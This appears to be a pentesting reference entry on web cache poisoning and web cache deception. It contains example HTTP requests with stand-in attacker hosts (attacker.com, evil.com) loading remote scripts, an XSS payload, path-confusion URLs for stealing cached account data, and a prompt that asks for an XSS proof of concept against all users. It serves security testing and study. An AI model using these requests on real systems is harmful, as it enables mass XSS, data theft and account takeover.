---
id: "cache-poisoning"
title: "Web Cache Poisoning & Web Cache Deception"
type: "technique"
category: "web-application"
subcategory: "deserialization"
tags: ["cache-poisoning", "cache-deception", "cdn", "unkeyed-headers", "param-miner", "portswigger"]
difficulty: "advanced"
platforms: ["linux", "macos", "windows"]
related: ["http-request-smuggling", "xss-techniques", "ssrf-techniques"]
updated: "2026-03-30"
---

## Overview

Web cache poisoning injects malicious content into cached responses served to other users. Web cache deception tricks the cache into storing sensitive user-specific pages. Both exploit how CDNs/proxies decide what to cache and what makes a "cache key." High-impact, low-competition — few hunters test for it.

## Web Cache Poisoning

### Concept
1. Find an **unkeyed input** (header/param the CDN ignores for caching but the back-end reflects)
2. Inject payload via that input
3. The poisoned response gets cached
4. All users requesting that URL get the poisoned version

### Finding Unkeyed Inputs

```bash
# Param Miner — Burp extension (automated)
# Scans for headers and params that affect response but aren't in cache key

# Common unkeyed headers to test:
X-Forwarded-Host
X-Forwarded-Scheme
X-Original-URL
X-Rewrite-URL
X-Forwarded-Port
X-Host
X-Forwarded-Server
X-Forwarded-Proto
```

### Unkeyed Header Injection
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

# If response contains: <script src="https://attacker.com/script.js">
# And the response is cached, all users get attacker's script
```

### Unkeyed Port
```http
GET / HTTP/1.1
Host: target.com:1234

# Some CDNs strip port from cache key but backend reflects it
# Response: <a href="https://target.com:1234/path">
# Poison with: Host: target.com"><script>alert(1)</script>
```

### Fat GET
```http
GET /api/config HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

admin=true

# Some frameworks process GET body; CDN caches based on URL only
```

### Parameter Cloaking
```
# CDN strips utm_ params; backend parses differently
GET /?param=value&utm_content=x;admin=true HTTP/1.1

# Ruby/Rails parameter delimiter confusion
GET /?param=safe&param=malicious HTTP/1.1
# CDN keys on first param, backend uses last
```

## Web Cache Deception

### Concept
1. Trick victim into visiting a URL that the cache treats as static
2. The cache stores the victim's personalized response (with their session data)
3. Attacker requests the same URL and gets the cached victim response

### Path Confusion
```
# Append static extension to dynamic page
https://target.com/account/settings/x.css
https://target.com/api/me/x.jpg
https://target.com/profile/.css

# CDN sees .css extension → caches as static
# Backend ignores the extra path → serves /account/settings with user data
```

### Delimiter Confusion
```
# Different systems treat delimiters differently
https://target.com/account%00.css     # Null byte
https://target.com/account%23.css     # Fragment
https://target.com/account;.css       # Semicolon (Java)
https://target.com/account%3f.css     # Question mark
```

### Normalization Confusion
```
# CDN normalizes, backend doesn't (or vice versa)
https://target.com/account/..%2fstatic/logo.png
# CDN: /static/logo.png (cached)
# Backend: /account/../static/logo.png → /account page with user data
```

## Exploitation Chains

### Cache poisoning → Stored XSS
```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

# Response (cached):
# <link rel="canonical" href="https://evil.com/page">
# Or: <script src="https://evil.com/xss.js"></script>
```

### Cache poisoning → CORS bypass
```http
GET /api/user HTTP/1.1
Host: target.com
Origin: https://evil.com

# If cached with permissive CORS headers, attacker can read any user's API response
```

### Cache deception → Account takeover
```
1. Send victim link: https://target.com/account/settings/x.css
2. Victim clicks, CDN caches their account page (with API keys, email, etc.)
3. Attacker fetches same URL, reads victim's cached data
```

## Detection & Testing

```bash
# 1. Identify the cache (Cloudflare, Akamai, Varnish, Fastly)
# Check response headers: X-Cache, CF-Cache-Status, Age, Via

# 2. Determine cache key
# Send same URL with different headers — if same cache hit, header is unkeyed
# Add cache buster: ?cb=random123 to test in isolation

# 3. Test for poisoning
# Inject via unkeyed input, add cache buster
# Request again without injection — if poisoned response returns, confirmed

# 4. Test for deception
# Append path extensions (.css, .js, .jpg, .png, .woff)
# Check if response is cached (Age header increases, X-Cache: HIT)
```

## Deep Dig Prompts

```
Given this CDN/cache setup [describe headers, technology]:
1. Identify all unkeyed inputs using Param Miner results.
2. Test each unkeyed input for reflection in the response.
3. Determine cache TTL and scope (per-user vs global).
4. Craft a cache poisoning PoC that delivers XSS to all users.
5. Test path confusion for web cache deception on /account, /api/me, /settings.
6. Check delimiter handling differences between CDN and origin.
```

## Tools

- **Param Miner** — Burp extension for finding unkeyed inputs
- **Web Cache Vulnerability Scanner** — Automated cache testing
- **Burp Suite** — Manual request manipulation
- **cURL** — Quick cache header analysis
